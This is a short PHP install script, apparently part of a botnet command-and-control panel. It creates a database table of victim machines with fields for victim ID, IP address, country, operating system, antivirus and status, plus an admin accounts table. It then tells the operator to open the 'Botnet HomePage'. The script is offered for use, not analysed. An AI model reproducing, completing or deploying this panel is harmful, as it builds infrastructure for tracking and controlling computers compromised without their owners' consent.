 <?php
include 'config.php';

$CreateClients = "CREATE TABLE Clients (id INT(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
VicID MEDIUMTEXT NOT NULL,
IPAdress LONGTEXT NOT NULL,
Contery LONGTEXT NOT NULL,
OS LONGTEXT NOT NULL,
AntiVirus LONGTEXT NOT NULL,
Status LONGTEXT NOT NULL)";
$quriy = mysqli_query($conn, $CreateClients);

    
$CreateAdmin = "CREATE TABLE admin (id INT(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
username MEDIUMTEXT NOT NULL,
password LONGTEXT NOT NULL,
role LONGTEXT NOT NULL)";

$quriy2 = mysqli_query($conn, $CreateAdmin);

mysqli_close($conn);
?> 

<!DOCTYPE html>
<html>
<head>
	<title>Database Structure</title>
</head>
<body>
<b>Create Clients Table [id,VicID,IPAdress,Contery,OS,AntiVirus,Status]</b><br>
<b>Create admin Table   [id,username,password,role]</b><br>
<b>Now You Can Access The Botnet HomePage and Regester a new Account</b>
</body>
</html>
